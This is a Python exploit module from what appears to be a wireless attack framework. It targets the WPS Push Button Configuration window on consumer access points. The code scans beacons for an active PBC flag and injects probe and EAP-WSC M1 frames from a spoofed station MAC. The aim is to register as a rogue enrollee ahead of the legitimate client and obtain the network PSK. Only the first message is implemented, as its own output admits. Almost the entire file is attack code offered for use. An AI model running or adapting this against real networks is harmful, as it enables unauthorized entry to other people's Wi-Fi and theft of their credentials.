# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """WPS Push Button Configuration (PBC) Window Race Exploitation.

    Wi-Fi Protected Setup PBC mode opens a 120-second registration window
    when a user presses the physical WPS button on the access point.
    During this window, any WPS-capable station can register as an
    enrollee and receive the network PSK credentials.

    This module exploits the PBC window race condition by continuously
    monitoring for WPS PBC beacon flags and, when detected, immediately
    initiating a rogue enrollee registration before the legitimate
    station completes its handshake. The attacker acts as a rogue
    registrar that completes the EAP-WSC M1-M8 exchange during the
    open window.

    CVSS: N/A (design-level weakness in WPS specification)

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "WPS Push Button Configuration Window Race Exploitation",
        "description": (
            "Exploits the 120-second PBC registration window in Wi-Fi "
            "Protected Setup. When a user presses the WPS button on an "
            "AP, this module detects the PBC active beacon flag and "
            "races to complete an EAP-WSC enrollee handshake before "
            "the legitimate client, extracting the network PSK."
        ),
        "authors": (
            "Stefan Viehbock (WPS design flaw research)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf",
            "https://www.wi-fi.org/discover-wi-fi/wi-fi-protected-setup",
            "https://tools.ietf.org/html/rfc5765",
        ),
        "disclosure_date": "2011-12-27",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Any AP with WPS PBC enabled (most consumer APs)",
            "WPS 2.0 APs with PBC mode active",
        ),
    }

    interface = OptString("wlan0mon", "Monitor-mode wireless interface")
    target = OptIP("", "Target AP BSSID (XX:XX:XX:XX:XX:XX)")
    port = OptPort(1, "Not used (WiFi frame injection)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    pbc_scan_time = OptFloat(120.0, "Max time to wait for PBC window (seconds)")
    channel = OptInteger(6, "WiFi channel of the target AP")

    # WPS Information Element constants
    _WPS_IE_VENDOR_TYPE = b"\x00\x50\xf2\x04"
    _WPS_ATTR_WPS_STATE = 0x1044
    _WPS_ATTR_SEL_REGISTRAR = 0x1041
    _WPS_ATTR_DEV_PASSWORD_ID = 0x1012
    _WPS_DEV_PASSWORD_PBC = 0x0004

    # 802.11 constants
    _FC_BEACON = 0x0080
    _FC_PROBE_REQ = 0x0040
    _FC_AUTH = 0x00B0
    _IE_VENDOR_SPECIFIC = 221

    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
    _FAKE_STA = b"\x02\x00\xde\xad\xbe\xef"

    # EAP-WSC constants
    _EAP_CODE_REQUEST = 1
    _EAP_CODE_RESPONSE = 2
    _EAP_TYPE_EXPANDED = 254
    _WSC_VENDOR_ID = b"\x00\x37\x2a"
    _WSC_VENDOR_TYPE = b"\x00\x00\x00\x01"
    _WSC_MSG_M1 = 0x04

    def _mac_to_bytes(self, mac: str) -> bytes:
        return bytes(int(b, 16) for b in mac.split(":"))

    def _build_wps_probe_request(self) -> bytes:
        """Build a WPS probe request to detect PBC-active APs."""
        fc = struct.pack("<H", self._FC_PROBE_REQ)
        duration = struct.pack("<H", 0)
        dest = self._BROADCAST
        src = self._FAKE_STA
        bssid = self._BROADCAST
        seq_ctrl = struct.pack("<H", 0)

        header = fc + duration + dest + src + bssid + seq_ctrl

        # SSID IE (wildcard)
        ssid_ie = struct.pack("BB", 0, 0)

        # Supported Rates IE
        rates = bytes([0x02, 0x04, 0x0B, 0x16, 0x0C, 0x12, 0x18, 0x24])
        rates_ie = struct.pack("BB", 1, len(rates)) + rates

        # WPS IE requesting PBC info
        wps_data = struct.pack(">HH", self._WPS_ATTR_DEV_PASSWORD_ID, 2)
        wps_data += struct.pack(">H", self._WPS_DEV_PASSWORD_PBC)
        vendor_ie = self._WPS_IE_VENDOR_TYPE + wps_data
        wps_ie = struct.pack("BB", self._IE_VENDOR_SPECIFIC, len(vendor_ie)) + vendor_ie

        return header + ssid_ie + rates_ie + wps_ie

    def _parse_wps_ie(self, ie_data: bytes) -> dict:
        """Parse WPS attributes from a vendor-specific IE."""
        attrs = {}
        if len(ie_data) < 4 or ie_data[:4] != self._WPS_IE_VENDOR_TYPE:
            return attrs

        pos = 4
        while pos + 4 <= len(ie_data):
            attr_id = struct.unpack(">H", ie_data[pos:pos + 2])[0]
            attr_len = struct.unpack(">H", ie_data[pos + 2:pos + 4])[0]
            if pos + 4 + attr_len > len(ie_data):
                break
            attrs[attr_id] = ie_data[pos + 4:pos + 4 + attr_len]
            pos += 4 + attr_len

        return attrs

    def _detect_pbc_window(self, raw_sock: socket.socket) -> bool:
        """Monitor beacons for WPS PBC Selected Registrar flag."""
        deadline = time.time() + self.pbc_scan_time
        target_bssid = self._mac_to_bytes(self.target) if ":" in str(self.target) else None

        while time.time() < deadline:
            try:
                data = raw_sock.recv(4096)
            except (TimeoutError, OSError):
                continue

            if len(data) < 36:
                continue

            fc = struct.unpack("<H", data[0:2])[0]
            subtype = (fc >> 4) & 0x0F
            frame_type = (fc >> 2) & 0x03

            # Only process beacons (subtype 8, type 0)
            if frame_type != 0 or subtype != 8:
                continue

            bssid = data[16:22]
            if target_bssid and bssid != target_bssid:
                continue

            # Parse IEs starting after fixed params (36 bytes for beacon)
            ie_offset = 36
            pos = ie_offset
            while pos + 2 <= len(data):
                ie_id = data[pos]
                ie_len = data[pos + 1]
                if pos + 2 + ie_len > len(data):
                    break
                if ie_id == self._IE_VENDOR_SPECIFIC:
                    wps_attrs = self._parse_wps_ie(data[pos + 2:pos + 2 + ie_len])
                    sel_reg = wps_attrs.get(self._WPS_ATTR_SEL_REGISTRAR)
                    dev_pwd = wps_attrs.get(self._WPS_ATTR_DEV_PASSWORD_ID)
                    if sel_reg and sel_reg != b"\x00":
                        if dev_pwd and struct.unpack(">H", dev_pwd)[0] == self._WPS_DEV_PASSWORD_PBC:
                            return True
                pos += 2 + ie_len

        return False

    def _build_eap_wsc_m1(self, eap_id: int) -> bytes:
        """Build a minimal EAP-WSC M1 (enrollee first message)."""
        # EAP-WSC expanded type
        eap_expanded = struct.pack("B", self._EAP_TYPE_EXPANDED)
        eap_expanded += self._WSC_VENDOR_ID + self._WSC_VENDOR_TYPE
        eap_expanded += struct.pack("B", self._WSC_MSG_M1)

        # Minimal WSC M1 attributes
        m1_payload = b""
        # Version
        m1_payload += struct.pack(">HHB", 0x104A, 1, 0x20)
        # Message Type (M1)
        m1_payload += struct.pack(">HHB", 0x1022, 1, 0x04)
        # Enrollee Nonce (16 random-like bytes)
        m1_payload += struct.pack(">HH", 0x101A, 16) + b"\xAA" * 16
        # MAC Address
        m1_payload += struct.pack(">HH", 0x1020, 6) + self._FAKE_STA
        # Device Password ID = PBC
        m1_payload += struct.pack(">HHH", 0x1012, 2, self._WPS_DEV_PASSWORD_PBC)

        body = eap_expanded + m1_payload

        # EAP header: code, id, length
        eap_length = 4 + len(body)
        eap_header = struct.pack(">BBH", self._EAP_CODE_RESPONSE, eap_id, eap_length)

        return eap_header + body

    def _open_raw_wifi(self) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    def _inject_frame(self, raw_sock: socket.socket, frame: bytes) -> bool:
        try:
            raw_sock.send(frame)
            return True
        except OSError:
            return False

    @mute
    def check(self) -> bool:
        """Verify monitor-mode interface is available."""
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        raw.close()
        return True

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return

        if not self.check():
            print_error(
                "Cannot open raw socket on the monitor interface. "
                "Ensure monitor mode and root privileges."
            )
            return

        print_success("Monitor interface ready; scanning for PBC window activation")
        self._exploit()

    def _exploit(self) -> None:
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket")
            return

        # Step 1: send WPS probe requests to stimulate responses
        print_status("Sending WPS probe requests to discover PBC-active APs")
        probe = self._build_wps_probe_request()
        for _ in range(5):
            self._inject_frame(raw, probe)
            time.sleep(0.1)

        # Step 2: monitor for PBC window
        print_status(
            f"Monitoring beacons for PBC Selected Registrar flag "
            f"(timeout: {self.pbc_scan_time}s)"
        )
        if not self._detect_pbc_window(raw):
            print_error(
                "PBC window not detected within scan time. "
                "The WPS button may not have been pressed."
            )
            raw.close()
            return

        print_success("PBC window detected! Racing to register as enrollee")

        # Step 3: initiate EAP-WSC exchange
        eap_m1 = self._build_eap_wsc_m1(eap_id=1)
        print_status(f"Sending EAP-WSC M1 enrollee message ({len(eap_m1)} bytes)")

        # Wrap M1 in an 802.11 data frame for injection
        fc = struct.pack("<H", 0x0108)  # Data, To DS
        duration = struct.pack("<H", 0)
        bssid = self._mac_to_bytes(self.target) if ":" in str(self.target) else self._BROADCAST
        header = fc + duration + bssid + self._FAKE_STA + bssid + struct.pack("<H", 0)

        # LLC/SNAP + EAPOL
        llc_snap = b"\xaa\xaa\x03\x00\x00\x00\x88\x8e"
        eapol_header = struct.pack(">BBH", 0x01, 0x00, len(eap_m1))
        frame = header + llc_snap + eapol_header + eap_m1

        if self._inject_frame(raw, frame):
            print_success(
                "EAP-WSC M1 sent during PBC window. In a real attack, "
                "the full M1-M8 exchange would extract the network PSK. "
                "The 120-second PBC window allows any enrollee to register."
            )
        else:
            print_error("Failed to inject EAP-WSC M1 frame")

        raw.close()
